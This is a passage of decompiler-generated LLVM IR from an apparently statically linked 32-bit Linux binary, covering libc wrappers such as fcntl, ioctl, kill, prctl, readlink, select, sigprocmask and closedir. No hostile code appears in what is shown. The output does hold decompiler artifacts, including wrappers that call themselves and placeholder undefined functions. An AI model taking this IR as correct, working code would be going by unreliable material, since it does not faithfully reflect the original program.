  %v5_8051440 = and i32 %v4_8051440, -256
  %v6_8051440 = or i32 %v5_8051440, %v3_8051440
  store i32 %v6_8051440, i32* %eax.global-to-local, align 4
  %v1_8051442 = add i32 %v0_8051442, -1
  store i32 %v1_8051442, i32* %ebx.global-to-local, align 4
  %v3_8051443 = inttoptr i32 %v2_8051443 to i8*
  store i8 %v2_8051440, i8* %v3_8051443, align 1
  %v0_8051445 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051445 = add i32 %v0_8051445, 1
  store i32 %v1_8051445, i32* %ecx.global-to-local, align 4
  %v0_8051446 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051446 = add i32 %v0_8051446, 1
  store i32 %v1_8051446, i32* %edx.global-to-local, align 4
  %v0_8051447 = load i32, i32* %ebx.global-to-local, align 4
  %v10_8051447 = icmp eq i32 %v0_8051447, -1
  %v1_805144a = icmp eq i1 %v10_8051447, false
  br i1 %v1_805144a, label %dec_label_pc_8051440, label %dec_label_pc_805144c.loopexit

dec_label_pc_805144c.loopexit:                    ; preds = %dec_label_pc_8051440
  br label %dec_label_pc_805144c

dec_label_pc_805144c:                             ; preds = %dec_label_pc_805144c.loopexit, %entry
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8051456:                             ; preds = %dec_label_pc_80513d7
  store i8 48, i8* %tmp25, align 1
  %v2_805145a = add i32 %arg3, 1
  %v3_805145a = inttoptr i32 %v2_805145a to i8*
  store i8 0, i8* %v3_805145a, align 1
  store i32 %arg3, i32* %eax.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_8051468:                             ; preds = %dec_label_pc_8051421
  store i32 %v0_8051418, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805142d

dec_label_pc_805146b:                             ; preds = %dec_label_pc_80513db
  %v1_805146d = icmp eq i1 %v3_80513d7, false
  br i1 %v1_805146d, label %dec_label_pc_80513e9, label %dec_label_pc_8051473

dec_label_pc_8051473:                             ; preds = %dec_label_pc_805146b
  store i32 1, i32* %stack_var_-68, align 4
  %v1_805147c = sub i32 0, %v4_80513cb
  store i32 %v1_805147c, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80513f2

; uselistorder directives
  uselistorder i32 %v1_805147c, { 1, 0 }
  uselistorder i32 %v1_8051446, { 1, 0 }
  uselistorder i32 %v1_8051445, { 1, 0 }
  uselistorder i32 %v1_8051437, { 0, 1, 3, 2 }
  uselistorder i32 %v2_805142d, { 1, 0, 2, 3 }
  uselistorder i32 %div21, { 1, 2, 0 }
  uselistorder i32 %v1_8051418, { 1, 0 }
  uselistorder i32 %v0_8051418, { 2, 1, 0, 3 }
  uselistorder i32 %v4_80513cb, { 2, 0, 1, 4, 3, 5 }
  uselistorder i8 48, { 3, 1, 0, 2 }
  uselistorder i8 45, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051437, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8051496 = add i32 %arg2, -12
  %v6_805149c = icmp ugt i32 %v1_8051496, 2
  br i1 %v6_805149c, label %dec_label_pc_80514af, label %dec_label_pc_805149e

dec_label_pc_805149e:                             ; preds = %entry
  %v1_80514aa = call i32 @int80_syscall(i32 221)
  br label %dec_label_pc_80514be

dec_label_pc_80514af:                             ; preds = %entry
  %v2_80514bb = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  br label %dec_label_pc_80514be

dec_label_pc_80514be:                             ; preds = %dec_label_pc_805149e, %dec_label_pc_80514af
  %v0_80514cd = phi i32 [ %v1_80514aa, %dec_label_pc_805149e ], [ %v2_80514bb, %dec_label_pc_80514af ]
  %tmp10 = icmp ult i32 %v0_80514cd, -4095
  br i1 %tmp10, label %dec_label_pc_80514d5, label %dec_label_pc_80514c8

dec_label_pc_80514c8:                             ; preds = %dec_label_pc_80514be
  %v1_80514cd = sub i32 0, %v0_80514cd
  store i32 %v1_80514cd, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80514d5

dec_label_pc_80514d5:                             ; preds = %dec_label_pc_80514be, %dec_label_pc_80514c8
  %v0_80514d6 = phi i32 [ %v0_80514cd, %dec_label_pc_80514be ], [ -1, %dec_label_pc_80514c8 ]
  ret i32 %v0_80514d6

; uselistorder directives
  uselistorder i32 %v0_80514cd, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80514d5, { 1, 0 }
  uselistorder label %dec_label_pc_80514be, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_80514d8 = load i32, i32* @esi, align 4
  %v0_80514d9 = load i32, i32* @ebx, align 4
  %v2_80514dd = ptrtoint i32* %stack_var_16 to i32
  store i32 %arg3, i32* @ebx, align 4
  %v0_80514e8 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80514ee = icmp eq i32 %v0_80514e8, 0
  br i1 %v1_80514ee, label %dec_label_pc_8051500, label %dec_label_pc_80514f2

dec_label_pc_80514f2:                             ; preds = %entry
  %v12_80514f2 = icmp eq i32 %arg2, 7
  br i1 %v12_80514f2, label %dec_label_pc_805152e, label %dec_label_pc_80514f9

dec_label_pc_80514f9:                             ; preds = %dec_label_pc_80514f2
  %v12_80514f9 = icmp eq i32 %arg2, 14
  br i1 %v12_80514f9, label %dec_label_pc_805152e, label %dec_label_pc_8051500

dec_label_pc_8051500:                             ; preds = %dec_label_pc_80514f9, %entry
  store i32 %arg3, i32* @edx, align 4
  %v1_8051512 = call i32 @int80_syscall(i32 221)
  %tmp11 = icmp ult i32 %v1_8051512, -4095
  br i1 %tmp11, label %dec_label_pc_805156b, label %dec_label_pc_805151f

dec_label_pc_805151f:                             ; preds = %dec_label_pc_8051500
  %v1_8051524 = sub i32 0, %v1_8051512
  store i32 %v1_8051524, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805156b

dec_label_pc_805152e:                             ; preds = %dec_label_pc_80514f9, %dec_label_pc_80514f2
  %v4_805152e = call i32 @__libc_enable_asynccancel(i32 %tmp5, i32 %v2_80514dd, i32 %v0_80514d9, i32 %v0_80514d8)
  store i32 %v4_805152e, i32* %edi.global-to-local, align 4
  %v0_8051539 = load i32, i32* @ebx, align 4
  store i32 %v0_8051539, i32* @edx, align 4
  %v1_8051547 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8051547, i32* @ebx, align 4
  %tmp12 = icmp ult i32 %v1_8051547, -4095
  br i1 %tmp12, label %dec_label_pc_8051562, label %dec_label_pc_8051555

dec_label_pc_8051555:                             ; preds = %dec_label_pc_805152e
  store i32 -1, i32* @ebx, align 4
  %v1_805155d = sub i32 0, %v1_8051547
  store i32 %v1_805155d, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8051562

dec_label_pc_8051562:                             ; preds = %dec_label_pc_805152e, %dec_label_pc_8051555
  %v0_8051562 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8051562, i32* @eax, align 4
  %v1_8051564 = call i32 @__libc_disable_asynccancel(i32 %v0_8051539)
  %v0_8051569 = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805156b

dec_label_pc_805156b:                             ; preds = %dec_label_pc_8051500, %dec_label_pc_805151f, %dec_label_pc_8051562
  %v0_805156f = phi i32 [ %v1_8051512, %dec_label_pc_8051500 ], [ -1, %dec_label_pc_805151f ], [ %v0_8051569, %dec_label_pc_8051562 ]
  store i32 %v0_80514d9, i32* @ebx, align 4
  store i32 %v0_80514d8, i32* @esi, align 4
  ret i32 %v0_805156f

; uselistorder directives
  uselistorder i32 %v1_8051547, { 1, 0, 2 }
  uselistorder i32 %v1_8051512, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805156b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051562, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v0_8051575 = call i32 @getppid()
  ret i32 %v0_8051575

; uselistorder directives
  uselistorder i32 ()* @getppid, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051578 = load i32, i32* @edi, align 4
  %v0_8051579 = load i32, i32* @esi, align 4
  %v0_805157a = load i32, i32* @ebx, align 4
  %v2_805157e = ptrtoint i32* %stack_var_16 to i32
  store i32 %arg3, i32* @ebx, align 4
  store i32 %v2_805157e, i32* %stack_var_-16, align 4
  %v0_8051589 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805158f = icmp eq i32 %v0_8051589, 0
  %v1_8051591 = icmp eq i1 %v1_805158f, false
  br i1 %v1_8051591, label %dec_label_pc_80515c1, label %dec_label_pc_8051593

dec_label_pc_8051593:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v3_80515a5 = call i32 @ioctl(i32 %arg3, i32 %v2_805157e, i32 %v0_805157a)
  %tmp11 = icmp ult i32 %v3_80515a5, -4095
  br i1 %tmp11, label %dec_label_pc_80515fe, label %dec_label_pc_80515b2

dec_label_pc_80515b2:                             ; preds = %dec_label_pc_8051593
  %v1_80515b7 = sub i32 0, %v3_80515a5
  store i32 %v1_80515b7, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80515fe

dec_label_pc_80515c1:                             ; preds = %entry
  %v4_80515c1 = call i32 @__libc_enable_asynccancel(i32 %v2_805157e, i32 %v0_805157a, i32 %v0_8051579, i32 %v0_8051578)
  store i32 %v4_80515c1, i32* @edi, align 4
  %v0_80515cc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80515da = load i32, i32* %stack_var_-16, align 4
  %v3_80515da = call i32 @ioctl(i32 %v0_80515cc, i32 %v1_80515da, i32 %v0_805157a)
  store i32 %v3_80515da, i32* @ebx, align 4
  %tmp12 = icmp ult i32 %v3_80515da, -4095
  br i1 %tmp12, label %dec_label_pc_80515f5, label %dec_label_pc_80515e8

dec_label_pc_80515e8:                             ; preds = %dec_label_pc_80515c1
  store i32 -1, i32* @ebx, align 4
  %v1_80515f0 = sub i32 0, %v3_80515da
  store i32 %v1_80515f0, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80515f5

dec_label_pc_80515f5:                             ; preds = %dec_label_pc_80515c1, %dec_label_pc_80515e8
  %v0_80515f5 = load i32, i32* @edi, align 4
  store i32 %v0_80515f5, i32* @eax, align 4
  %v1_80515f7 = call i32 @__libc_disable_asynccancel(i32 %v0_80515cc)
  %v0_80515fc = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80515fe

dec_label_pc_80515fe:                             ; preds = %dec_label_pc_8051593, %dec_label_pc_80515b2, %dec_label_pc_80515f5
  %v0_8051602 = phi i32 [ %v3_80515a5, %dec_label_pc_8051593 ], [ -1, %dec_label_pc_80515b2 ], [ %v0_80515fc, %dec_label_pc_80515f5 ]
  store i32 %v0_805157a, i32* @ebx, align 4
  store i32 %v0_8051579, i32* @esi, align 4
  store i32 %v0_8051578, i32* @edi, align 4
  ret i32 %v0_8051602

; uselistorder directives
  uselistorder i32 %v3_80515da, { 1, 0, 2 }
  uselistorder i32 %v3_80515a5, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80515fe, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80515f5, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051613 = call i32 @kill(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_8051615 = load i32, i32* @edx, align 4
  store i32 %v1_8051615, i32* @ebx, align 4
  store i32 %v2_8051613, i32* @edx, align 4
  %tmp3 = icmp ult i32 %v2_8051613, -4095
  br i1 %tmp3, label %dec_label_pc_805162e, label %dec_label_pc_8051621

dec_label_pc_8051621:                             ; preds = %entry
  %v1_8051626 = sub i32 0, %v2_8051613
  store i32 %v1_8051626, i32* @edx, align 4
  store i32 %v1_8051626, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805162e

dec_label_pc_805162e:                             ; preds = %entry, %dec_label_pc_8051621
  %v0_805162e = phi i32 [ %v2_8051613, %entry ], [ -1, %dec_label_pc_8051621 ]
  ret i32 %v0_805162e

; uselistorder directives
  uselistorder i32 %v2_8051613, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @kill, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805162e, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8051631 = load i32, i32* @esi, align 4
  %v0_8051646 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805164e = call i32 @prctl(i32 %v0_8051646, i32 %v0_8051631)
  %tmp10 = icmp ult i32 %v3_805164e, -4095
  br i1 %tmp10, label %dec_label_pc_8051668, label %dec_label_pc_805165b

dec_label_pc_805165b:                             ; preds = %entry
  %v1_8051660 = sub i32 0, %v3_805164e
  store i32 %v1_8051660, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8051668

dec_label_pc_8051668:                             ; preds = %entry, %dec_label_pc_805165b
  %v0_805166a = phi i32 [ %v3_805164e, %entry ], [ -1, %dec_label_pc_805165b ]
  ret i32 %v0_805166a

; uselistorder directives
  uselistorder i32 %v3_805164e, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_8051668, { 1, 0 }
}

define i32 @readlink(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8051678 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051680 = call i32 @readlink(i32 %v0_8051678)
  store i32 %v0_8051678, i32* @ebx, align 4
  %tmp6 = icmp ult i32 %v1_8051680, -4095
  br i1 %tmp6, label %dec_label_pc_805169a, label %dec_label_pc_805168d

dec_label_pc_805168d:                             ; preds = %entry
  %v1_8051692 = sub i32 0, %v1_8051680
  store i32 %v1_8051692, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805169a

dec_label_pc_805169a:                             ; preds = %entry, %dec_label_pc_805168d
  %v0_805169a = phi i32 [ %v1_8051680, %entry ], [ -1, %dec_label_pc_805168d ]
  ret i32 %v0_805169a

; uselistorder directives
  uselistorder i32 %v1_8051680, { 1, 2, 0 }
  uselistorder i32 (i32)* @readlink, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805169a, { 1, 0 }
}

define i32 @__syscall_select(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_805169f = load i32, i32* @ebx, align 4
  store i32 %v0_805169f, i32* %stack_var_-16, align 4
  %v1_80516b6 = call i32 @int80_syscall(i32 142)
  %tmp9 = icmp ult i32 %v1_80516b6, -4095
  br i1 %tmp9, label %dec_label_pc_80516d0, label %dec_label_pc_80516c3

dec_label_pc_80516c3:                             ; preds = %entry
  %v1_80516c8 = sub i32 0, %v1_80516b6
  store i32 %v1_80516c8, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80516d0

dec_label_pc_80516d0:                             ; preds = %entry, %dec_label_pc_80516c3
  %v0_80516d4 = phi i32 [ %v1_80516b6, %entry ], [ -1, %dec_label_pc_80516c3 ]
  %v2_80516d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80516d0, i32* @ebx, align 4
  ret i32 %v0_80516d4

; uselistorder directives
  uselistorder i32 %v1_80516b6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80516d0, { 1, 0 }
}

define i32 @__libc_select() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_80516d5 = load i32, i32* @ebp, align 4
  %v0_80516d6 = load i32, i32* @edi, align 4
  %v0_80516d7 = load i32, i32* @esi, align 4
  %v0_80516d8 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp4, i32* %stack_var_-24, align 4
  store i32 %tmp2, i32* @ebp, align 4
  store i32 %tmp1, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_80516f3 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80516f9 = icmp eq i32 %v0_80516f3, 0
  %v1_80516fb = icmp eq i1 %v1_80516f9, false
  br i1 %v1_80516fb, label %entry.dec_label_pc_8051714_crit_edge, label %dec_label_pc_80516fd

entry.dec_label_pc_8051714_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051714

dec_label_pc_80516fd:                             ; preds = %entry
  store i32 %tmp2, i32* @ecx, align 4
  store i32 %tmp3, i32* @edx, align 4
  store i32 %tmp4, i32* @eax, align 4
  store i32 %v0_80516d8, i32* @ebx, align 4
  store i32 %v0_80516d7, i32* @esi, align 4
  store i32 %v0_80516d6, i32* @edi, align 4
  store i32 %v0_80516d5, i32* @ebp, align 4
  %v3_8051712 = call i32 @__syscall_select(i32 %tmp4, i32 %v0_80516d8, i32 %v0_80516d7)
  br label %dec_label_pc_8051714

dec_label_pc_8051714:                             ; preds = %entry.dec_label_pc_8051714_crit_edge, %dec_label_pc_80516fd
  %stack_var_8.0 = phi i32 [ %tmp3, %entry.dec_label_pc_8051714_crit_edge ], [ %tmp, %dec_label_pc_80516fd ]
  %v4_8051714 = call i32 @__libc_enable_asynccancel(i32 %stack_var_8.0, i32 %tmp2, i32 %tmp1, i32 %tmp)
  %v0_8051719 = load i32, i32* @ebp, align 4
  store i32 %v0_8051719, i32* @ecx, align 4
  %v0_805171f = load i32, i32* @ebx, align 4
  %v0_8051720 = load i32, i32* @edi, align 4
  store i32 %v0_8051720, i32* %stack_var_-32, align 4
  %v0_8051721 = load i32, i32* @esi, align 4
  store i32 %v0_8051721, i32* @edx, align 4
  %v3_8051723 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8051723, i32* @eax, align 4
  %v3_8051727 = call i32 @__syscall_select(i32 %v0_8051720, i32 %v0_805171f, i32 %v4_8051714)
  store i32 %v3_8051727, i32* @ebx, align 4
  store i32 %v4_8051714, i32* @eax, align 4
  %v0_8051732 = load i32, i32* %stack_var_-32, align 4
  %v1_8051732 = call i32 @__libc_disable_asynccancel(i32 %v0_8051732)
  %v0_805173a = load i32, i32* @ebx, align 4
  store i32 %v0_80516d8, i32* @ebx, align 4
  store i32 %v0_80516d7, i32* @esi, align 4
  store i32 %v0_80516d6, i32* @edi, align 4
  store i32 %v0_80516d5, i32* @ebp, align 4
  ret i32 %v0_805173a

; uselistorder directives
  uselistorder i32 %tmp3, { 1, 0, 2 }
  uselistorder i32 %tmp2, { 2, 0, 1 }
  uselistorder i32 %tmp1, { 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051714, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %v0_8051749 = call i32 @setsid()
  %tmp = icmp ult i32 %v0_8051749, -4095
  br i1 %tmp, label %dec_label_pc_8051762, label %dec_label_pc_8051755

dec_label_pc_8051755:                             ; preds = %entry
  %v1_805175a = sub i32 0, %v0_8051749
  store i32 %v1_805175a, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8051762

dec_label_pc_8051762:                             ; preds = %entry, %dec_label_pc_8051755
  %v0_8051762 = phi i32 [ %v0_8051749, %entry ], [ -1, %dec_label_pc_8051755 ]
  ret i32 %v0_8051762

; uselistorder directives
  uselistorder i32 %v0_8051749, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051762, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp5 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v15_8051765 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8051768 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  %v1_805176c = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v1_805176c, label %dec_label_pc_8051792, label %dec_label_pc_8051770

dec_label_pc_8051770:                             ; preds = %entry
  %v1_8051770 = getelementptr inbounds %_TYPEDEF_sigset_t, %_TYPEDEF_sigset_t* %arg2, i32 0, i32 0, i32 0
  %v2_8051770 = load i32, i32* %v1_8051770, align 4
  %v4_8051770 = icmp slt i32 %v2_8051770, 0
  %.pre = add i32 %v4_8051768, 4
  br i1 %v4_8051770, label %dec_label_pc_805177b, label %dec_label_pc_8051775

dec_label_pc_8051775:                             ; preds = %dec_label_pc_8051770
  %v2_8051775 = inttoptr i32 %.pre to i8*
  %v3_8051775 = load i8, i8* %v2_8051775, align 1
  %v4_8051775 = urem i8 %v3_8051775, 2
  %v5_8051775 = icmp eq i8 %v4_8051775, 0
  br i1 %v5_8051775, label %dec_label_pc_8051792, label %dec_label_pc_805177b

dec_label_pc_805177b:                             ; preds = %dec_label_pc_8051770, %dec_label_pc_8051775
  %v2_805177b = inttoptr i32 %.pre to i32*
  %v3_805177b = load i32, i32* %v2_805177b, align 4
  %v2_805177e = load i32, i32* %v1_8051770, align 4
  %v1_8051780 = urem i32 %v2_805177e, -2147483648
  %v1_8051786 = and i32 %v3_805177b, -2
  store i32 %v1_8051780, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8051792

dec_label_pc_8051792:                             ; preds = %dec_label_pc_8051775, %entry, %dec_label_pc_805177b
  %v2_80517c2 = phi i32 [ %tmp9, %dec_label_pc_8051775 ], [ %tmp9, %entry ], [ %v1_8051786, %dec_label_pc_805177b ]
  %v1_80517a7 = phi i32 [ %v4_8051768, %dec_label_pc_8051775 ], [ %v4_8051768, %entry ], [ %v15_8051765, %dec_label_pc_805177b ]
  %v2_80517a7 = inttoptr i32 %v1_80517a7 to %_TYPEDEF_sigset_t*
  %v6_80517a7 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %v2_80517a7, %_TYPEDEF_sigset_t* %tmp5)
  %tmp13 = icmp ult i32 %v6_80517a7, -4095
  br i1 %tmp13, label %dec_label_pc_80517c1, label %dec_label_pc_80517b4

dec_label_pc_80517b4:                             ; preds = %dec_label_pc_8051792
  %v1_80517b9 = sub i32 0, %v6_80517a7
  store i32 %v1_80517b9, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80517c1

dec_label_pc_80517c1:                             ; preds = %dec_label_pc_8051792, %dec_label_pc_80517b4
  %v0_80517c4 = phi i32 [ %v6_80517a7, %dec_label_pc_8051792 ], [ -1, %dec_label_pc_80517b4 ]
  store i32 %v2_80517c2, i32* @ecx, align 4
  ret i32 %v0_80517c4

; uselistorder directives
  uselistorder i32 %v6_80517a7, { 1, 2, 0 }
  uselistorder i32 %v4_8051768, { 1, 2, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80517c1, { 1, 0 }
  uselistorder label %dec_label_pc_8051792, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805177b, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v0_80517cc = load i32, i32* @ebx, align 4
  %v2_80517d3 = call i32 @time(i32* %arg1)
  store i32 %v0_80517cc, i32* @ebx, align 4
  store i32 %tmp1, i32* @ecx, align 4
  ret i32 %v2_80517d3
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_80517d8 = load i32, i32* @edi, align 4
  %v0_80517d9 = load i32, i32* @esi, align 4
  %v0_80517da = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* @edi, align 4
  %v2_80517e2 = load i32, i32* %arg1, align 4
  %v12_80517e2 = icmp eq i32 %v2_80517e2, -1
  %v1_80517e5 = icmp eq i1 %v12_80517e2, false
  br i1 %v1_80517e5, label %dec_label_pc_80517f5, label %dec_label_pc_80517e7

dec_label_pc_80517e7:                             ; preds = %entry
  br label %dec_label_pc_8051850

dec_label_pc_80517f5:                             ; preds = %entry
  %v12_80517db = ptrtoint i32* %stack_var_-28 to i32
  %v1_80517f5 = add i32 %tmp3, 24
  store i32 %v12_80517db, i32* @esi, align 4
  %v4_8051803 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134559876, i32 %v1_80517f5)
  %v1_8051809 = call i32 @__pthread_return_0(i32 %v1_80517f5)
  %v0_805180e = load i32, i32* @edi, align 4
  %v1_805180e = inttoptr i32 %v0_805180e to i32*
  %v2_805180e = load i32, i32* %v1_805180e, align 4
  store i32 %v2_805180e, i32* @ebx, align 4
  store i32 -1, i32* %v1_805180e, align 4
  %v3_8051819 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805181e = load i32, i32* @edi, align 4
  %v1_805181e = add i32 %v0_805181e, 12
  %v2_805181e = inttoptr i32 %v1_805181e to i32*
  %v3_805181e = load i32, i32* %v2_805181e, align 4
  %v1_8051821 = call i32 @free(i32 %v3_805181e)
  %v0_8051826 = load i32, i32* @edi, align 4
  %v1_8051827 = call i32 @free(i32 %v0_8051826)
  %v0_805182c = load i32, i32* @ebx, align 4
  %v1_8051835 = call i32 @close(i32 %v0_805182c)
  %tmp17 = icmp ult i32 %v1_8051835, -4095
  br i1 %tmp17, label %dec_label_pc_8051853, label %dec_label_pc_8051846

dec_label_pc_8051846:                             ; preds = %dec_label_pc_80517f5
  %v1_805184b = sub i32 0, %v1_8051835
  br label %dec_label_pc_8051850

dec_label_pc_8051850:                             ; preds = %dec_label_pc_80517e7, %dec_label_pc_8051846
  %storemerge = phi i32 [ %v1_805184b, %dec_label_pc_8051846 ], [ 9, %dec_label_pc_80517e7 ]
  store i32 %storemerge, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8051853

dec_label_pc_8051853:                             ; preds = %dec_label_pc_80517f5, %dec_label_pc_8051850
  %v0_8051859 = phi i32 [ %v1_8051835, %dec_label_pc_80517f5 ], [ -1, %dec_label_pc_8051850 ]
  store i32 %v0_80517da, i32* @ebx, align 4
  store i32 %v0_80517d9, i32* @esi, align 4
  store i32 %v0_80517d8, i32* @edi, align 4
  ret i32 %v0_8051859

; uselistorder directives
  uselistorder i32 %v1_8051835, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051853, { 1, 0 }
  uselistorder label %dec_label_pc_8051850, { 1, 0 }
}

define i32 @fd_to_DIR() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805185c = load i32, i32* @edi, align 4
  %v0_805185d = load i32, i32* @esi, align 4
  %v0_805185e = load i32, i32* @ebx, align 4
  store i32 %v0_805185e, i32* %stack_var_-12, align 4
  %v0_805185f = load i32, i32* @eax, align 4
  store i32 %v0_805185f, i32* @edi, align 4
  %v15_8051861 = ptrtoint i32* %stack_var_-36 to i32
  %v0_8051864 = load i32, i32* @edx, align 4
  store i32 %v0_8051864, i32* @ebx, align 4
  %v1_8051868 = call i32 @malloc(i32 48)
  %v1_8051870 = icmp eq i32 %v1_8051868, 0
  br i1 %v1_8051870, label %dec_label_pc_80518db, label %dec_label_pc_8051874

dec_label_pc_8051874:                             ; preds = %entry
  store i32 %v1_8051868, i32* @esi, align 4
  %v0_8051876 = load i32, i32* @edi, align 4
  %v2_8051876 = inttoptr i32 %v1_8051868 to i32*
  store i32 %v0_8051876, i32* %v2_8051876, align 4
  %v1_8051878 = add i32 %v1_8051868, 16
  %v2_8051878 = inttoptr i32 %v1_8051878 to i32*
  store i32 0, i32* %v2_8051878, align 4
  %v1_805187f = add i32 %v1_8051868, 8
  %v2_805187f = inttoptr i32 %v1_805187f to i32*
  store i32 0, i32* %v2_805187f, align 4
  %v1_8051886 = add i32 %v1_8051868, 4
  %v2_8051886 = inttoptr i32 %v1_8051886 to i32*
  store i32 0, i32* %v2_8051886, align 4
  %v0_805188d = load i32, i32* @ebx, align 4
  %v2_805188d = add i32 %v1_8051868, 20
  %v3_805188d = inttoptr i32 %v2_805188d to i32*
  store i32 %v0_805188d, i32* %v3_805188d, align 4
  %v0_8051890 = load i32, i32* @ebx, align 4
  %v6_8051896 = icmp ugt i32 %v0_8051890, 511
  br i1 %v6_8051896, label %dec_label_pc_805189f, label %dec_label_pc_8051898

dec_label_pc_8051898:                             ; preds = %dec_label_pc_8051874
  store i32 512, i32* %v3_805188d, align 4
  br label %dec_label_pc_805189f

dec_label_pc_805189f:                             ; preds = %dec_label_pc_8051874, %dec_label_pc_8051898
  %v0_805189f = load i32, i32* @esi, align 4
  %v1_805189f = add i32 %v0_805189f, 20
